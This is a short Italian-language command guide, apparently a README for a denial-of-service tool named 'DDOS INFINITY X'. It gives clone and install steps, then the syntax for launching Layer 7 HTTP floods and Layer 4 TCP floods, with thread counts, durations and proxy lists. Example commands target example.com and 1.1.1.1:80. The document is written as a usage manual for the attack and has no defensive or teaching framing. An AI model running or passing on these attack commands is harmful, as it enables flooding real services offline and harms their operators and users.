# Comandi — DDOS INFINITY X

Vedi anche: [COMMANDS.md](../COMMANDS.md) (inglese, completo)

## Installazione

```bash
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
pip3 install -r requirements.txt
```

Kali:

```bash
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

## Comandi base

```bash
python3 start.py HELP
python3 start.py tools
python3 start.py STOP
python3 start.py MENU
```

## Layer 7

```bash
python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
```

```bash
python3 start.py GET http://example.com 0 1000 http.txt 10 100
```

## Layer 4

```bash
python3 start.py <method> <ip:port> <threads> <duration>
```

```bash
python3 start.py TCP 1.1.1.1:80 500 60
```

## Layer 4 + proxy

```bash
python3 start.py TCP 1.1.1.1:80 500 60 5 http.txt
```

## Proxy: 0=ALL 1=HTTP 4=SOCKS4 5=SOCKS5 6=RANDOM
